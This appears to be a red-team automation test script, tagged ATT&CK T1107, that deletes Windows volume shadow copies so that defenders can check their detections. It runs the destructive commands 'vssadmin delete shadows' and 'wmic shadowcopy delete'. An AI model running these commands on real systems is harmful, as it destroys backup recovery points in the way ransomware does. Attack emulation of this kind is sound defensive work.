# Name: Volume Shadow Copy Deletion with vssadmin and wmic
# RTA: delete_volume_shadow.py
# ATT&CK: T1107
# Description: Uses both vssadmin.exe and wmic.exe to delete volume shadow copies.

import common
import platform


def main():
    if platform.system() != 'Windows':
        common.log("This script only runs on Windows.")
        return common.UNSUPPORTED_RTA

    common.log("Deleting volume shadow copies...")
    # Delete the oldest shadow copy using vssadmin
    common.execute(["vssadmin.exe", "delete", "shadows", "/for=c:", "/oldest", "/quiet"])
    # Delete shadow copies using wmic
    common.execute(["wmic.exe", "shadowcopy", "delete", "/nointeractive"])


if __name__ == "__main__":
    exit(main())
